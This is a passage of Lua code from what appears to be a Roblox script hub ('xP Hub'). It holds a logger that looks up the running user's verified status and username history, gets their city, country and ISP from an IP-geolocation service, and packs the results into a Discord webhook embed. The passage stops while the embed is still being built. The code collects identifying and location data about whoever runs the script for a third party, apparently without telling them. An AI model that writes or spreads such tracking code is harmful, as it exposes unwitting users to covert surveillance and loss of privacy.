                    end
                end
            end)

            pcall(function()
                local verifyReq = reqFunc({
                    Url    = "https://users.roblox.com/v1/users/" .. userId,
                    Method = "GET"
                })
                if verifyReq and verifyReq.Body then
                    local verifyData = HttpService:JSONDecode(verifyReq.Body)
                    if verifyData and verifyData.hasVerifiedBadge ~= nil then
                        isVerified = verifyData.hasVerifiedBadge
                    end
                end
            end)

            pcall(function()
                local histUrls = {
                    "https://users.roblox.com/v1/users/" .. userId .. "/username-history?limit=10&sortOrder=Asc",
                    "https://users.roblox.com/v1/users/" .. userId .. "/username-history?limit=10",
                    "https://users.roblox.com/v1/users/" .. userId .. "/username-history"
                }
                for _, url in ipairs(histUrls) do
                    local histReq = reqFunc({
                        Url = url, Method = "GET",
                        Headers = {
                            ["Content-Type"] = "application/json",
                            ["Accept"]       = "application/json"
                        }
                    })
                    if histReq and histReq.Body and #histReq.Body > 0 then
                        local okDecode, histData = pcall(function()
                            return HttpService:JSONDecode(histReq.Body)
                        end)
                        if okDecode and histData and type(histData.data) == "table" and #histData.data > 0 then
                            local names = {}
                            for _, entry in ipairs(histData.data) do
                                if entry and entry.name and type(entry.name) == "string" and entry.name ~= "" then
                                    table.insert(names, sanitizeForDiscord(entry.name, 50))
                                end
                            end
                            if #names > 0 then nameHistory = table.concat(names, " → ") return end
                        end
                    end
                end
            end)
            nameHistory = sanitizeForDiscord(nameHistory, 900)

            pcall(function()
                local ipReq = reqFunc({ Url = "https://ipapi.co/json/", Method = "GET" })
                if ipReq and ipReq.Body then
                    local ipData = HttpService:JSONDecode(ipReq.Body)
                    if ipData and ipData.city and ipData.country_name then
                        ipInfo = string.format("%s, %s (%s)",
                            sanitizeForDiscord(ipData.city, 50),
                            sanitizeForDiscord(ipData.country_name, 50),
                            sanitizeForDiscord(ipData.org or "N/A", 100))
                    end
                end
            end)
            ipInfo = sanitizeForDiscord(ipInfo, 200)

            local timestamp = os.date("%Y-%m-%d %H:%M:%S")

            local payload = {
                username   = "xP Hub Logger",
                avatar_url = avatarUrl,
                embeds = {
                    {
                        title     = "🚀 xP Hub Executed",
                        color     = 3447003,
                        thumbnail = { url = avatarUrl },
                        fields = {
                            { name = "🎮 Game Name",       value = "```" .. gameName      .. "```\n[🔗 Abrir no Roblox](" .. gameLink .. ")", inline = false },
                            { name = "🗺️ Place ID",        value = "```" .. placeIdStr    .. "```", inline = true  },
